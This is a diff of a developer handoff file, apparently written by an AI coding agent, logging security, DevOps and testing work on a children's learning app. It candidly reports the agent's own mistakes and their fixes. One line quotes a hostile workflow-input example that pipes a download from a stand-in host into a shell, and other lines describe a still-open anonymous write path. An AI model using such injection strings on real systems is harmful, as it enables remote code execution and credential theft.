@@ -68,7 +68,7 @@
 > REAL HAND on a real camera** — MediaPipe is proven to boot on prod under the enforced CSP
 > (`Graph successfully started running.`, 0 violations), but the band's defining feature is
 > unverified end to end and only the founder can close it. Everything is committed; prod is on
-> **sw v111**.
+> **sw v116**.
 >
 > ---
 >
@@ -76,6 +76,150 @@
 > Older blocks are in [docs/handoff-archive.md](docs/handoff-archive.md), which is NOT auto-loaded —
 > `grep` it. This file is inlined into every session's context, so move blocks out rather than
 > letting it grow. The craft rules live in chapter-craft.md, not here.)_
+
+> 🧭 **2026-08-18 — THREE ASKS (ARCHITECTURE · SECURITY · DEVOPS), AND THE SAME QUESTION BROKE ALL THREE OPEN: "so the things you flagged are fixed?" WAS ASKED THREE TIMES AND FOUND SOMETHING EVERY TIME — A GATE THAT TESTED NOTHING, A WORKFLOW THAT WOULD FAIL EVERY MONDAY, AND FLAGS I HAD CALLED VERIFIED WITHOUT RUNNING THEM.** 🧭 SHIPPED — `main`@`1e9e497`, prod serving **sw v116**. `tsc` 0 · **1122/1122 vitest** (was 1098, **+24**) · `next build` 0 · **211/211 chapters (7.7m)** · **152 passed + 48 skipped short-landscape (57.1m)** · eslint **132, unchanged**.
+>
+> **The asks:** a clean-architecture refactor → *"commit it on main"* → *"yes push it"* → a senior-security audit → *"fix all Vs in one go"* → *"put the remaining ones in the md files"* → *"see the security md and what can we fix now"* → a senior-DevOps pass → *"if you want you can do this now"* (the nightly) → *"you can go with this also"* (the weekly) → *"commit and push"*.
+>
+> ⚠️⚠️ **TWO COMMITS IN THIS RANGE ARE NOT MINE — ANOTHER SESSION IS COMMITTING IN THIS REPO CONCURRENTLY.** `4114e43` (AR camera door + a leads-retention migration) appeared on top of my work mid-session, and `1e9e497` committed and pushed MY working tree while I was checking `git status` between two calls. Both were verified rather than assumed: `1e9e497` contains exactly my six files with all five fixes intact. **If the tree moves under you, check `git log` before concluding anything about your own state.**
+>
+> ## ⓪ ⚠️⚠️ THE METHOD LESSON, AND IT IS THE WHOLE SESSION
+> Three times the founder asked whether the flagged things were actually done. Three times the answer
+> was no, and each time the gap was **something I had reported as verified**:
+> - "are the Vs fixed?" → the React-in-`core/` item had been fixed **by someone else**, and I nearly
+>   claimed it.
+> - "are the flagged things fixed?" (devops) → **`npm run dev` binds 3000 while the workflow polled
+>   3017.** The weekly job would have died at the health check every Monday. It only worked locally
+>   because `preview_start` reads `.claude/launch.json`, which pins 3017; CI has no launch.json.
+> - the same question again → the `supabase db dump` flags I called "verified" had **never been run**;
+>   I had only tested the `openssl` half.
+> **The pattern is not carelessness, it is scope: I verified the part I built and assumed the part I
+> configured.** Ask of any "done": which half did I actually execute?
+>
+> ## ① ARCHITECTURE — THE PREMISE WAS FALSE, AND THAT WAS THE DELIVERABLE
+> Asked for a clean-architecture rebuild. **Measured first: the layering is already correct** — `core`
+> imports only `core`, zero upward deps, Supabase confined to 4 files, and 14 framework-free logic
+> modules (4,697 lines) already split from 37 chapter components. A rewrite would have been pure risk
+> against 1,100 passing tests. **Refused it, and fixed the one real defect instead:** `state/store.ts`
+> re-exported `ChapterType`/`CHAPTER_*`/levelling "so existing imports keep working" — an unfinished
+> migration shim, so 11 modules pulled zustand + IndexedDB + Supabase to get a *type*, and
+> `core/adaptive.ts` imported the store (a real cycle `core → state → core`). Repointed all 11,
+> deleted the barrel. `src/__tests__/layering.test.ts` gates it; mutation-tested.
+>
+> ## ② SECURITY — V13–V20, NO CRITICAL OR HIGH, AND ONE I INFLICTED MYSELF
+> Tenant isolation re-verified **live**, not read off migrations: as `anon`, `learners`/`sessions`/
+> `learner_invites` return **0 rows**; `diagnostic_leads`/`error_events` refuse `42501`.
+> - ⚠️⚠️ **V19 — I CREATED THE VULNERABILITY WHILE FIXING V16.** `prune_error_events()` was created
+>   `SECURITY DEFINER`, and **Postgres gives that `PUBLIC EXECUTE` by default** while Supabase exposes
+>   every public-schema function at `/rest/v1/rpc/<name>`. For a few minutes **any anonymous caller
+>   could have wiped the crash log.** Caught by checking `proacl` instead of trusting `{"success":true}`.
+>   **THE RULE: always pair `create function … security definer` with an explicit `REVOKE`, then read
+>   `proacl` back.** Now 0 of 17 functions in `public` are anon-callable, 0 have an unpinned `search_path`.
+> - **V14** `/api/lead` did `await fetch(...)` with no `res.ok` — fetch does not throw on 4xx/5xx, so a
+>   403 returned `{ok:true}` and the lead vanished **with no signal anywhere**.
+> - **V15 CSP `'unsafe-inline'` is ACCEPTED, deliberately.** Removing it needs a per-request nonce,
+>   which forces every prerendered page dynamic (prod serves `x-vercel-cache: PRERENDER`); Trusted
+>   Types would likely break the AR path. It is tolerable **only because the app has zero injection
+>   sinks** — so the *premise* is gated (`security.test.ts` fails the build the day one appears),
+>   not the header. Re-open when UGC ships.
+> - **V17** `learners.date_of_birth` — an exact birthdate on a child, written `null` by its only caller,
+>   **never read**, 0 of 17 rows populated. Dropped.
+> - **V13 IS STILL OPEN** and is the one thing here the founder must unblock (see ▶1).
+> ⚠️ **The four `SECURITY DEFINER` advisor WARNs are intentional — do NOT "fix" them by revoking
+> EXECUTE; the app calls them.** All check ownership and pin `search_path`. Recorded in security.md.
+>
+> ## ③ DEVOPS — THE DESIGN EXISTED; THE INFRASTRUCTURE IT DESCRIBED DID NOT
+> `ci.yml`, `deploy.yml` (staging→prod with an approval gate) and `preflight.sh` were already good.
+> **What was wrong is that `docs/devops.md` described a stack that is not real:**
+> - ⚠️⚠️ **THE ORG IS ON THE SUPABASE FREE PLAN, AND THE BIGGEST DOWNTIME RISK IS NOT TRAFFIC — IT IS
+>   QUIET.** Supabase's own docs: *"We may pause applications on the Free Plan that exhibit low
+>   activity in a 7-day period."* **8 children have ever played; last `chapter_open` 2026-08-15.** A
+>   paused project = no auth, no sync, a login screen that never resolves. **And `/api/health` returns
+>   a cheerful 200 through exactly that outage** (it is deliberately shallow, no DB call) — so an
+>   uptime monitor pointed only there reports green while nobody can sign in. Point a second check at
+>   something that reads the DB.
+> - **No downloadable backup exists on free.** Built `backup.yml`: `supabase db dump` → **encrypted**
+>   → 30-day artifact. The encryption is load-bearing (the dump holds learner names and every session
+>   played; a workflow artifact is readable by anyone with repo access).
+>   ⚠️ **AND THE RESTORE HAS A TRAP:** Supabase's docs say restored tables *"inherit ALL privileges
+>   from default privileges in the target database"* — **this app's security is partly GRANTS** (V12 is
+>   a column-level `UPDATE(status)`; V19/`touch_grades` are EXECUTE revokes). A naive restore hands all
+>   of it back while every RLS policy still looks correct. The runbook now leads with
+>   `ALTER DEFAULT PRIVILEGES … REVOKE ALL`.
+> - ⚠️ **THE DATABASE IS IN THE WRONG HEMISPHERE.** Measured `x-vercel-id: bom1::iad1` — functions run
+>   in **Virginia**, Supabase is **Sydney**, and the browser talks to Supabase *directly*, so every
+>   auth call crosses ~250–300 ms on app-open. **Region is fixed at project creation.** At 17 learners
+>   it is an afternoon; at 10,000 it is a project. **Decide before launch.**
+> - **Docker/K8s was explicitly asked for and explicitly refused:** it would trade Vercel's CDN, image
+>   optimizer and preview deploys for a cluster to patch, on an app with 7 prod deps and 17 learners.
+>
+> ## ④ ⚠️⚠️ BOTH NEW E2E GATES WERE VACUOUS ON FIRST WRITE — THE SAME BUG, TWO DISGUISES
+> GitHub Actions passes **`''`** for an unset `workflow_dispatch` input on a `schedule` run:
+> - `E2E_ONLY=''` → `''?.split(',')` is `['']` (optional chaining does **not** short-circuit on an
+>   empty string) → filters to `[]` → **`[]` IS TRUTHY** → every chapter skipped. **211 tests → 1,
+>   reporting green.** Proven by reverting the fix and re-listing.
+> - `E2E_SEED=''` → `??` does not catch `''` and **`Number('')` is 0** → the weekly would sweep seed
+>   `0` while every dispatch used the pinned `20260817`, so a red run would not reproduce — defeating
+>   the entire reason the suite was seeded.
+> Both fixed **in the specs** (so a shell `export E2E_ONLY=` is safe too) and guarded in the workflows.
+> **ASSUME ANY `${{ inputs.x }}` REACHING A SPEC IS `''`, NOT UNSET.**
+> ⚠️ **AND THE TWO JOBS NEED DIFFERENT SERVERS; SWAPPING THEM FAILS SILENTLY.** `nightly-e2e` uses
+> `next start` (production build — faster, truer CSP/React). `weekly-layout` **must** use `next dev`,
+> because `reachPractice` reads `[data-test-answer]`, which is dead-code-eliminated from any production
+> build. On `next start` every `reachPractice` finds no board and the suite **measures the wrong screen
+> while passing.**
+> Both suites were watched green end to end before shipping: **211/211 (7.7m)** and **152 passed +
+> 48 skipped (57.1m)**. The 48 skips are `explore:` on the 12–14 band, which has no explore sims — the
+> known dropped-EXPLORE-beats gap, reported rather than silently passed. **24% of that suite is
+> currently inert for that reason.**
+>
+> ## ⑤ ⚠️ FOUR DOCUMENTS WERE ASSERTING THINGS THAT WERE NO LONGER TRUE
+> Same class as *a comment asserting a rule is followed is the most expensive kind of lie*, in the
+> files you read during an incident:
+> - `security.md` described an enforced/Report-Only CSP split with *"deliberately no `default-src`"* —
+>   untrue since the CSP went enforcing on 08-16. Replaced with the measured header.
+> - `security_baseline.sql` was **6 weeks stale** (2026-07-03), predating `diagnostic_leads`,
+>   `auth_events` and `error_events` — the drift check that exists to catch dashboard changes would
+>   have shown a wall of legitimate diff and been ignored. **And its generator query had been lost to
+>   "see git history", which is WHY it went stale.** Restored in full, now including column-level
+>   grants — the blind spot that would hide V12.
+> - `devops.md` listed **PITR** in the architecture diagram and told you to enable it; not available
+>   on free.
+> - `launch-plan.md` had three stale OPEN rows: analytics (*"zero deps installed"* — prod shows
+>   **1,191 `session_start` / 797 `chapter_open`**), legal routes (*"none exist"* — they do; the text
+>   is what is open), and monitoring.
+>
+> ## ⚠️ AND THE ONE I SHIPPED THAT ANOTHER SESSION CAUGHT: SCRIPT INJECTION IN MY OWN WORKFLOWS
+> I wrote `${{ github.event.inputs.only }}` **inside the `run:` script**. Actions expands `${{ }}`
+> before bash sees the line, so a dispatch input of `"; curl evil.sh | sh; #` executes on a runner that
+> holds repo-scoped credentials. The fix (routing the value through `env:` so bash reads it as data) is
+> in the working tree **uncommitted** on both workflow files. Only a collaborator can dispatch these, so
+> it is hardening rather than an open hole — but it is the exact shape of bug I spent the session
+> hunting, in code I wrote. **Never interpolate a dispatch input into a shell script.**
+>
+> ## ▶ OPEN
+> 1. ⚠️⚠️ **`SUPABASE_SERVICE_ROLE_KEY` IN VERCEL — NOW GATES THREE THINGS.** V13 (anon can still POST
+>    `/rest/v1/diagnostic_leads` directly, skipping `/api/lead`'s limit — proven exploitable), durable
+>    crash retention (`error_events` stays empty), and `/api/lead` falling back to the anon key.
+>    ⚠️ **STRICT ORDER: set the key → apply `20260816170000_leads_server_only.sql` → submit one real
+>    lead and confirm it lands.** Reversed, lead capture stops (loudly now, thanks to V14).
+> 2. ⚠️ **SUPABASE PRO (~$25/mo) IS A LAUNCH DECISION, NOT A NICE-TO-HAVE** — it buys no-pause,
+>    downloadable backups and PITR. On free the app can be taken offline by its own quietness.
+> 3. **Commit the script-injection fix** (2 workflow files, in the tree, uncommitted).
+> 4. **Dashboard-only, still open:** leaked-password protection · Auth rate limits · refresh-token
+>    lifetime · `SUPABASE_DB_URL` (activates the CI RLS suite) · `MONITORING_INGEST_URL` ·
+>    `BACKUP_PASSPHRASE` + `PROD_PROJECT_REF` (activates `backup.yml`) · uptime monitor (two checks,
+>    one that touches the DB) · GitHub Environments with a required reviewer on `production`.
+> 5. **Rehearse one restore** into a scratch project. A backup nobody has restored is a hope, and this
+>    one has the privilege trap in ③.
+> 6. **Everything from prior sessions stands:** B1 attorney (`DRAFT = true` is LIVE on prod) · **AR has
+>    never been driven with a real hand** · `practice_complete` still 0 rows (nobody has played since
+>    the P0 fix — "no data yet", not "still broken", but it is unproven) · 132 eslint errors, deliberately.
+> 7. Of this session's faults, **three came from the founder asking "is it done?"**, one from reading
+>    Supabase's own docs, one from a lost generator query, one from `gpg` not being installed (my
+>    "verification" was a missing command), one from my own grep counting `×` in `740×360` as failures
+>    and reporting **590 false failures**, and **one from another session reviewing my workflow.**
+>    The 1,122-test suite was green through every one of them.
 
 > ⚡ **2026-08-17 (2nd session) — A PERFORMANCE PASS. 57 MB OF ART WAS REVALIDATED ON EVERY REQUEST, EVERY BACKDROP SHIPPED AS FULL-SIZE PNG, AND EVERY CREATURE JOURNEY RELAID OUT THE DOCUMENT ON EVERY FRAME. NONE OF THEM CHANGED A SINGLE PIXEL, WHICH IS WHY THEY ALL SHIPPED — ⚠️ AND THE FOURTH FINDING, THE ONE I WAS SUREST OF, TURNED OUT TO BE DEAD CODE THAT NEVER RAN.** ⚡ SHIPPED — `main`@`d21fd36`, **21 commits**, prod serving **sw v113** (confirmed on the live origin). `tsc` 0 · **1098/1098 vitest** (was 1071, **+27**) · `next build` 0 · **211/211 chapters × 3 frames LOCAL** (prod: 209 + 2 blocked by Vercel's own firewall, both green on re-run — see ▶7) · eslint **132, unchanged**.
 >
@@ -397,140 +541,4 @@
 >    samples is a coin flip — seed it*, and *do not mistake a shrink-to-fit element's OUTPUT box for
 >    the space it was given*.
 
-> 🔒 **2026-08-16 (2nd session) — LAUNCH HARDENING, ROUND TWO. THREE ASKS, AND EVERY ONE OF THEM TURNED UP SOMETHING WORSE THAN THE THING ASKED ABOUT: A DEAD END A CHILD COULD NOT ESCAPE, A GATE THAT HAD BEEN RED FOR A DAY, AND THE RECORDED VOICE SILENTLY DEAD ON MOBILE.** 🔒 SHIPPED — `main`@`c80e1c7`, prod serving **sw v104**. `tsc` 0 · **1051/1051 vitest** (was 1039, **+12**) · `next build` 0 · **211/211 chapters × 3 frames** · preflight green.
->
-> **The asks:** *"abhi kya karna hai plan ke according?"* → *"karo"* (the scratch-pad fix) → *"woh dono
-> chapter waise hi rahege… bina neon mein"* → *"1, 2, 3 …. teeno karo"* → *"the things which are
-> remaining on your side do that all"*.
->
-> ## 🔒 THE FOUNDER'S CALL: C13 IS CLOSED, NOT DONE — **OrderDesk and LevelRun STAY STORYBOOK**
-> The 9–11 band is finished at eight on GameShell and two on `SkillBeat`, **mixed by design**. Both
-> pass the C7 gate as they are. Recorded in the header table, [docs/launch-plan.md](docs/launch-plan.md)
-> (C13 ❌ DROPPED) and the memory index, because a stale plan makes the next session start porting them.
->
-> ## ① ⚠️⚠️ THE WALKTHROUGH HAD NO SCALE-TO-FIT AT ALL, AND ITS SKIP BUTTON WAS OFF THE SCREEN
-> Reported as *"the chalkboard overlaps the tray at 800×450"*. It is not the board: **every 9–11
-> chapter answers on an `Instrument` rather than a `TutorialScene`, so every one takes
-> `TutorialPlayer`'s legacy path — and that path rendered the instrument bare inside `CenterFill`
-> while the PLAY stage wrapped it in `FitSlot`.** The fault is the one `FitSlot`'s own doc comment
-> describes, left in place on the single path that never got it. Measured: the tray painted
-> **741 × 319 inside a 560 × 314 slot** — 90px over each side, 52px UP across the chalkboard — with
-> the step transport pushed off the bottom and **"I've got it →" at y 474–503 of a 450px viewport
-> with no scroll. Unreachable: a child on that frame could not leave the walkthrough.**
-> ⚠️ **MY FIRST DIAGNOSIS WAS WRONG AND THE INSTRUMENTATION IS WHAT CAUGHT IT.** I matched it to the
-> stale-ResizeObserver fault recorded that morning, rewrote `FitSlot` with a layout effect, and the
-> bug did not move. A temporary `data-av` attribute showed **ZERO FitSlot boxes in that subtree** —
-> the component I had spent an hour on was not on screen. Reverted whole; the real fix is one wrapper.
-> ⚠️ **AND THE GATE I WROTE FOR IT FIRST FAILED FOR THE WRONG REASON.** `button:visible.first()` is
-> `‹ Menu`, so it walked out to the AUTH page and reported "Sign in", "Terms" and "Continue with
-> Google" as offscreen. **It failed on the planted regression, so it looked like a working gate — and
-> it would have failed identically with the bug fixed.** Now it takes the largest non-Menu button and
-> asserts the URL did not change. Re-planted: fails on `decimals` AND `areaPerimeter` naming the real
-> controls. `all-chapters.spec.ts` now presses the primary control once and re-runs the fit checks —
-> **the start card is the one screen that always fits, which is why five checks over 70 chapters had
-> never seen this.**
->
-> ## ② ⚠️⚠️ THE C7 GATE HAD BEEN 210/211 RED SINCE THE CSP WENT ENFORCING, AND NOBODY KNEW
-> `script-src` dropped `'unsafe-eval'`, which **React's DEVELOPMENT build needs and production does
-> not** — so every page logged a console error against the dev server the gate is documented to
-> drive, and the gate's contract is *zero console errors*. It hid for a day because the run that
-> certified 211/211 was pointed at prod with `E2E_BASE_URL`. **Confirmed pre-existing by stashing my
-> change and re-running.** Now branched on `NODE_ENV`; the production header is byte-identical.
-> **Gated in BOTH directions** ([cspHeader.test.ts](src/__tests__/cspHeader.test.ts), which drives the
-> real `headers()` at each env rather than checking the source string): a leak to production is the
-> dangerous half, losing it in dev is the half that eats a day. `next.config.ts` had no gate of any kind.
->
-> ## ③ ⚠️⚠️ AND THE PROD CONSOLE GAVE UP THE BIGGEST ONE — `media-src` WAS NEVER SET, SO THE RECORDED VOICE WAS SILENTLY DEAD ON MOBILE
-> `default-src 'self'` was the fallback and it blocked the `data:` WAV that `unlockVoiceClips()`
-> plays inside the intro tap — **the mobile-autoplay unlock**, i.e. the one gesture that grants iOS
-> playback to the single reused `<audio>` the whole app plays through. Blocked, it is never unlocked,
-> so **every pre-rendered ElevenLabs clip in bands 12–18 falls back to browser speech**, which most
-> Chrome installs do not have. **Nothing reports it**: the player swallows its own errors by design (a
-> missing clip must fall back, not throw), so on a desktop it is one console line and on a phone it is
-> a chapter that has gone quiet.
-> **That is THREE things the enforced CSP broke whose failure is invisible until a specific device
-> does a specific thing — the fonts, MediaPipe, and this.** The rule is now in chapter-craft: read the
-> prod console on a real page after any header change; a 200 on every route says nothing.
-> ⚠️ **And it took a FRESH TAB to believe the fix** — the console buffer survives navigation, so the
-> old violation kept printing against the new header and read exactly like a deploy that had not landed.
-> ✅ **The same drive proved MediaPipe DOES boot on prod under the enforced CSP** — console reads
-> `Graph successfully started running.` with 0 violations, i.e. the jsDelivr WASM, the WebAssembly
-> instantiation, the `blob:` worker and the googleapis model all load. That was reasoned before; it is
-> measured now. **A real hand on a real camera is still unproven and is the founder's to close.**
->
-> ## ④ THE PUBLIC WRITE PATHS ARE RATE-LIMITED (launch-plan finding #9)
-> `diagnostic_leads` was written straight from the browser with the anon key — **which is public by
-> design, it ships in the JS bundle** — so there was nowhere a limit could go, and the original
-> migration named "Supabase Auth rate limits" as the mitigation, which does not apply to a table
-> write. Capture now goes through `/api/lead` (6/min per IP + a real email shape check; the table's
-> CHECK only bounds LENGTH, so every 3-character string was a valid lead).
-> ⚠️ **`/api/report-error` is arguably the bigger one**: unlimited, it forwards every POST to
-> `MONITORING_INGEST_URL`, so the moment C3 is wired an open endpoint becomes an open billing line on
-> someone else's service and the noise buries the crash it exists to surface. 30/min, dropped
-> **silently** (200, not 429) — a browser that has just crashed must not be handed an error to handle.
-> `ponytail:` in-memory and per serverless instance, a named ceiling with its upgrade path (WAF).
-> ⚠️ **Mutation-tested 6/6, and the survivor mattered**: clearing the key map when a NEW key arrives
-> passed every other test and defeats the limit completely — rotate one IP between calls and the
-> counter is wiped. That property is asserted now.
->
-> ## ⑤ ESLINT: **227 → 133**, AND TEN OF THEM WERE REAL DEFECTS
-> Founder reaffirmed after being told a mass hook refactor is the riskiest thing to do in launch week.
-> Done in slices, gates green after each. What it actually found:
-> - **a `// eslint-disable-line` written after another `//`** — inert text inside the first comment,
->   counted as an error for months (ForestWalk).
-> - **`MiloMark`'s id was a MODULE COUNTER in `useMemo`** — not SSR-safe, so server and client can
->   disagree, and that suffix names both the CSS class and the `@keyframes`: the class points at an
->   animation that went out under another name and **silently does not animate.** Now `useId()`.
-> - **`ToastProvider` published its setter DURING RENDER** — a discarded or StrictMode render leaves a
->   setter for a tree React threw away.
-> - **`WalkHome`'s route MUTATED a ref during render** — accumulating, so a doubled render adds a
->   duplicate corner no re-render can remove. Now React's sanctioned adjust-during-render.
-> - **FIVE answer surfaces were components declared INSIDE their parent**, so React remounted the
->   element the child was touching: a `<input type="range">` losing its drag mid-gesture (WalkHome),
->   three nudge rows, and `motion` elements whose springs restarted mid-flight (the balance beam, the
->   tickets, the paint pour). `static-components` is now **0**.
-> - **TWO chapters painted the PREVIOUS round's answer for a frame** on every new question, and the
->   child's own wrong answer for a frame on the reveal — `useEffect(…, [task])` runs after paint. This
->   is the class chapter-craft already records; found by the lint rather than by a screenshot.
->
-> ⚠️ **AND TWO I ALMOST SHIPPED MYSELF, BOTH CAUGHT BY CHECKING THE EDIT RATHER THAN THE RESULT:**
-> the script threading `disabled` into six call sites **silently matched nothing** (`[^>]` cannot
-> cross the `=>` in `on={(n) => …}`), and `tsc` stayed clean **because the prop is optional** — so the
-> rows would have stayed LIVE during the walkthrough and the reveal. Proven fixed by reading
-> `.disabled` off all four nudges in the browser. And `gameKit`'s `P` is a **prop**, not a module
-> constant (the shared kit serves every band's palette) — `tsc` caught that one.
->
-> ⚠️ **`useLatestRef` ([src/shared/hooks/useLatestRef.ts](src/shared/hooks/useLatestRef.ts)) holds the
-> idiom that appeared verbatim in 21 files**, and the write STAYS in the render phase with ONE
-> documented disable. The rule is right in general — but that assignment is **idempotent**, whereas
-> WalkHome's was accumulating, and moving it to an effect changes timing across the AR path and the
-> critter engine for no behavioural gain. **Know which kind of render-phase write you have.**
->
-> ## ▶ OPEN — and NOTHING on my side is unblocked
-> 1. ⚠️⚠️ **B1 ATTORNEY IS STILL THE ONLY ITEM THAT CANNOT BE COMPRESSED.** The plumbing is done; it
->    is a paste into `src/app/legal/content.ts` plus `DRAFT = false`.
-> 2. **Accounts → I wire in minutes:** monitoring ingest URL (C3) · analytics (C4) · SMTP (B6 — **no
->    email is sent at all today**) → unblocks C12.
-> 3. **Dashboard toggles:** leaked-password, Auth rate limits, Vercel WAF, PITR, staging.
-> 4. **Prod DDL is the founder's — TWO migrations now.** ⚠️ `20260816170000_leads_server_only.sql`
->    must NOT be applied until `SUPABASE_SERVICE_ROLE_KEY` is set in Vercel and a lead is seen to
->    land, or capture stops **silently**. `20260816120000_perf_advisors.sql` (C10b) is not blocking.
->    ⚠️ **7 test rows of mine are in the prod leads table** (`a@b.com` ×6, `c@d.com`, 2026-08-16) —
->    verified 7 match / 5 remain. **The dev server points at PROD**, which is how they got there.
-> 5. **B9 + F5 — a real human on a real device, and 20 minutes watching a real child.** Fold the AR
->    camera into it: MediaPipe boots on prod, a real hand has never been read on GameShell.
-> 6. **133 eslint errors left, and the recommendation is to LEAVE them.** They are dominated by
->    async-data-loading `set-state-in-effect`, which is correct under this architecture; clearing them
->    means a Suspense/`use()` migration (post-launch) or 133 disable comments that bury the signal
->    that just caught ten real bugs. **A count is not the goal; an unread gate is the problem.**
-> 7. **The EXPLORE beats are still gone** and the **re-teach has still never been seen fire**.
-> 8. Of this session's faults, **one came from a founder screenshot (①), one from stashing my change
->    and re-running (②), one from the PROD CONSOLE (③), one from a mutation survivor (④), two from
->    checking that my own edit landed (⑤), and one from `tsc`. None from the existing test suite** —
->    which stayed 100% green through every one of them.
-> 9. **Where the rules went:** `chapter-craft.md` gained *a component with two states must put BOTH in
->    flow*, *a gate last run against production can be broken against the server it documents*, and
->    *a security header breaks things that do not fail until a specific device does a specific thing —
->    read the prod console on a real page*.
-
-_Older sessions (2026-06-15 → **2026-08-15**) live in [docs/handoff-archive.md](docs/handoff-archive.md) — not loaded at session start. `grep` it for a chapter or a decision. Moved there to keep this file inside its size budget: the two 2026-08-14 blocks (🧱 all six neon chapters onto GameShell · 🎛️ the band moving onto the 12–18 engine) on 2026-08-16, 🏗️ **The Empty Plot** (the last neon chapter + the 3D deletion + the explainer-film pipeline) on 2026-08-17, 📊 **The Loading Bay** (the first storybook chapter onto GameShell, and the mastery exit finally seen to fire) and 🚀 **the first launch-hardening day** (0 security advisories, crash screens, self-hosted fonts, the enforced CSP, legal plumbing, the launch runbook) both on 2026-08-17._
+_Older sessions (2026-06-15 → **2026-08-15**) live in [docs/handoff-archive.md](docs/handoff-archive.md) — not loaded at session start. `grep` it for a chapter or a decision. Moved there to keep this file inside its size budget: the two 2026-08-14 blocks (🧱 all six neon chapters onto GameShell · 🎛️ the band moving onto the 12–18 engine) on 2026-08-16, 🏗️ **The Empty Plot** (the last neon chapter + the 3D deletion + the explainer-film pipeline) on 2026-08-17, 📊 **The Loading Bay** (the first storybook chapter onto GameShell, and the mastery exit finally seen to fire) and 🚀 **the first launch-hardening day** (0 security advisories, crash screens, self-hosted fonts, the enforced CSP, legal plumbing, the launch runbook) both on 2026-08-17, and 🔒 **launch hardening round two** (the walkthrough dead end, the CSP gate that had been red for a day, `media-src` silently killing the recorded voice on mobile) on 2026-08-18._
